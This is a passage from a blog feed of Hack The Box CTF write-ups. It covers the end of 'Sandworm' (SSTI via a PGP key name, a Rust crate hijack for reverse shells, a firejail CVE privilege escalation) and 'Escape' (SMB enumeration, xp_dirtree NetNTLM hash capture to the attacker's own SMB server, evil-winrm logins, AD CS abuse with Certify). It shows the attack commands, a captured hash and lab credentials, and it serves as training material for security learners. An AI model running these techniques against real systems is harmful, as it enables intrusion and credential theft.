+I had only a single entry point that could give me output which was through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Verify Signature&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/guide&lt;/code&gt; endpoint.&lt;/p&gt;
+
+&lt;h3 id=&quot;crafting-the-exploit&quot;&gt;Crafting the exploit&lt;/h3&gt;
+
+&lt;p&gt;The injection point is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt; of the PGP key, so I’ve generated a key called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syl&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gpg &lt;span class=&quot;nt&quot;&gt;--gen-key&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The exploit is described/explained &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;After that, we need to export the public key using this command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gpg &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; public_key.key &lt;span class=&quot;nt&quot;&gt;--export&lt;/span&gt; syl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;then we should craft an arbitrary message:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;test&apos;&lt;/span&gt; | gpg &lt;span class=&quot;nt&quot;&gt;--clear-sign&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;h3 id=&quot;common-issues&quot;&gt;Common Issues&lt;/h3&gt;
+
+&lt;p&gt;While crafting this, I’ve experienced serious hassles such as:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;wrongfully crafting the message&lt;/li&gt;
+  &lt;li&gt;using different key to encrypt the message&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I fixed those issues when I started clean and using only 1 key, and whenever asked for anything “passphrase/name” I just typed “syl”.&lt;/p&gt;
+
+&lt;p&gt;To check the current keys that you have:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gpg --list-keys
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Another useful website is this one: https://www.sobyte.net/post/2021-12/modify-gpg-uid-name/ I’ve used the article to modify the name of the key, and then to export the public key again.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Upon crafting the message, paste the message and the public key and click to verify the signature, this would get you a reverse shell to the machine.&lt;/p&gt;
+
+&lt;h2 id=&quot;atlas-firejailed&quot;&gt;Atlas (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firejailed&lt;/code&gt;)&lt;/h2&gt;
+
+&lt;p&gt;The user that we got &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atlas&lt;/code&gt; is actually is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firejailed&lt;/code&gt;, commands such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget/curl&lt;/code&gt; are not available in the environment. The pivot point is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;httpie&lt;/code&gt; directory in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$HOME&lt;/code&gt; folder. There you can find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.json&lt;/code&gt; file where the SSH credentials for the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;silentobserver&lt;/code&gt; are.&lt;/p&gt;
+
+&lt;h2 id=&quot;silentobserver&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;silentobserver&lt;/code&gt;&lt;/h2&gt;
+
+&lt;p&gt;I ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; to check where would my next pivoting point would be, I stumbled fairly fast on these files that I could write:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/opt/crates/logger/src
+/opt/crates/logger/src/lib.rs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I noticed the application located in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt&lt;/code&gt; directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/tipnet/&lt;/code&gt; I’ve examined the source code, and it is some sort of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rust&lt;/code&gt; application, I already got a hint to those writable directories and whenever I saw the source code:&lt;/p&gt;
+
+&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;crate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;nn&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keywords&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.as_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;justification&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.as_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Invoking it later on.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I knew that I could modify the crate that could be executed by the application.&lt;/p&gt;
+
+&lt;p&gt;But what is this application? And where is it running?&lt;/p&gt;
+
+&lt;h2 id=&quot;tipnet-application&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Tipnet&lt;/code&gt; Application&lt;/h2&gt;
+
+&lt;p&gt;This application is running like that:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/sh -c cd /opt/tipnet &amp;amp;&amp;amp; bin/echo &quot;e&quot; | /bin/sudo -u atlas /usr/bin/cargo run --offline sleep 10
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atlas(not firejailed)&lt;/code&gt; is running it, so this could be our next attack vector.&lt;/p&gt;
+
+&lt;p&gt;I’ve crafted a rust reverse shell: https://doc.rust-lang.org/std/process/struct.Command.html and added it into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logger/src/lib.rs&lt;/code&gt; file then I build the crate using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cargo build&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;After some seconds, your listener should be getting a connection from the server, that would be the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atlas&lt;/code&gt; user.&lt;/p&gt;
+
+&lt;h1 id=&quot;atlas-user-to-root&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Atlas&lt;/code&gt; user to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;&lt;/h1&gt;
+
+&lt;p&gt;Fairly simple and straightforward, this is a &lt;a href=&quot;https://github.com/advisories/GHSA-m2xv-wgqg-4gxh&quot; title=&quot;CVE-2022-31214&quot;&gt;CVE-2022-31214&lt;/a&gt; vulnerability. You can use the already crafted exploits for that:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://www.openwall.com/lists/oss-security/2022/06/08/10&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;There are issues with that exploit, I believe it is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wait&lt;/code&gt; mechanism. To make sure that it is working correctly add a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;breakpoint()&lt;/code&gt; in the beginning of the script then you can follow the execution by pressing “n”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/htb/htb-sandworm-firejail.png&quot; alt=&quot;rwojak&quot; /&gt;&lt;/p&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">I began with a simple scan, to check the ports of the machine.</summary></entry><entry><title type="html">Hack The Box - Escape [Medium]</title><link href="http://localhost:4000/ctf-writeup/2023/06/10/htb-escape.html" rel="alternate" type="text/html" title="Hack The Box - Escape [Medium]" /><published>2023-06-10T00:00:00+03:00</published><updated>2023-06-10T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/06/10/htb-escape</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/06/10/htb-escape.html">&lt;p&gt;This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I’ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.&lt;/p&gt;
+
+&lt;p&gt;I am still learning Active Directory at the time of writing this, so there might be errors, I will do my best to mitigate that!&lt;/p&gt;
+
+&lt;h2 id=&quot;enumerating&quot;&gt;Enumerating&lt;/h2&gt;
+
+&lt;p&gt;I started with a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.11.202
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+1433/tcp open  ms-sql-s
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now since I am new to Active Directory I turned to https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb to check what I can try.&lt;/p&gt;
+
+&lt;p&gt;Eventually, after trying most of them, I landed on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbclient &lt;span class=&quot;nt&quot;&gt;--no-pass&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.11.202
+Sharename       Type      Comment
+&lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
+ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;         Disk      Remote Admin
+C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;             Disk      Default share
+IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;           IPC       Remote IPC
+NETLOGON        Disk      Logon server share 
+Public          Disk      
+SYSVOL          Disk      Logon server share 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is a list of shared folders, the one that we can take a look at is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Public&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; //10.10.11.202/Public
+Try &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt; to get a list of possible commands.
+smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Sat Nov 19 06:51:25 2022
+  ..                                  D        0  Sat Nov 19 06:51:25 2022
+  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
+
+  5184255 blocks of size 4096. 1276406 blocks available
+smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; get &lt;span class=&quot;s2&quot;&gt;&quot;SQL Server Procedures.pdf&quot;&lt;/span&gt;
+getting file &lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;QL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;62.8 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 62.8 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Opening, the PDF states that we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PublicUser:GuestUserCantWrite1&lt;/code&gt; to log in to the SQL Server. We can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket-mssqlclient&lt;/code&gt; which is a tool&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;impacket-mssqlclient WORKGROUP/PublicUser:GuestUserCantWrite1@10.10.11.202
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once I was in I started enumerating the database, looking at this and that, but I had no luck, I turned to some write-ups to follow up.&lt;/p&gt;
+
+&lt;p&gt;Now most of the write-ups are just skipping the explanation of this step, but I think that it is really important to know what’s going on, so I will do my best to explain it.&lt;/p&gt;
+
+&lt;p&gt;Following up this https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack attack, I tried the following thing:&lt;/p&gt;
+
+&lt;p&gt;I checked if I can execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xp_dirtree&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-SQL&quot;&gt;SQL&amp;gt; EXEC sp_helprotect &apos;xp_dirtree&apos;;
+Owner    Object                 Grantee        Grantor   ProtectType   Action           Column   
+
+------   --------------------   ------------   -------   -----------   --------------   ------   
+
+sys      xp_dirtree             public         dbo       b&apos;Grant     &apos;   Execute          .        
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It turns out I can, so to capture the authentication hash, I need to set up an SMB server:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# My Machine&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;impacket-smbserver &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt; smb ./smb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And then to execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xp_dirtree&lt;/code&gt; on the SQL Server&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-SQL&quot;&gt;SQL&amp;gt; exec master.dbo.xp_dirtree &apos;\\&amp;lt;myIP&amp;gt;\smb&apos;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Doing this would catch the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AUTHENTICATE_MESSAGE&lt;/code&gt;, the user and the hash.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;impacket-smbserver &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt; smb ./smb
+
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Incoming connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.11.202,52180&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; AUTHENTICATE_MESSAGE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sequel&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ql_svc,DC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; User DC&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ql_svc authenticated successfully
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; sql_svc::sequel:aaaaaaaaaaaaaaaa:84e0a29415d2823f80593c9bc45d158c:010100000000000080fba2b8945ed9010f6267444f7024440000000001001000780056007a005000590061005000570003001000780056007a0050005900610050005700020010006c004f0054006f006f00540076007700040010006c004f0054006f006f005400760077000700080080fba2b8945ed90106000400020000000800300030000000000000000000000000300000c57e7de4e6e8e7baebb297a4bfc1a9019bc96f8f58ffbd9cb233cec428ece87f0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100340032000000000000000000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now I need to crack the hash, I won’t post the results here, so you have to figure that one on your own, it is simple enough! :)&lt;/p&gt;
+
+&lt;p&gt;Using the cracked password, I can log in using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;--ip&lt;/span&gt; 10.10.11.202 &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt; sql_svc &lt;span class=&quot;nt&quot;&gt;--password&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ./password&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, we need to start enumerating again. I used &lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&quot;&gt;winPEAS&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\sql_svc\Documents&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/home/syl/tools/win/winPEASany.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I eventually stumbled across interesting files and I’ve enumerated the users. The interesting file was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\SQLServer\Logs\ERRORLOG.BAK&lt;/code&gt; and upon further inspection I’ve got the password for the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ryan.Cooper&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;--ip&lt;/span&gt; 10.10.11.202 &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt; Ryan.Cooper &lt;span class=&quot;nt&quot;&gt;--password&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ./password ryan_password&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+...
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;yan.Cooper&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; gc ../Desktop/user.txt
+&amp;lt;user_hash&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now I needed to escalate, I’ve used this guide for misconfigured certificates that cause AD CS Domain Escalation. https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation&lt;/p&gt;
+
+&lt;p&gt;I’ve uploaded Certify to the SQL Server (user login) and tried to find vulnerable certificates.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: Certify is a tool to enumerate and abuse misconfigured AD CS, you can find its source code here: https://github.com/GhostPack/Certify. Unfortunately(or fortunately) there aren’t any prebuilt binaries and you have to build it yourself. It is well explained in the README.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\Ryan.Cooper\Documents&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/Certify.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/vulnerable&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Vulnerable&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Certificates&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Templates&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CA&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                               &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dc.sequel.htb\sequel-DC-CA&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
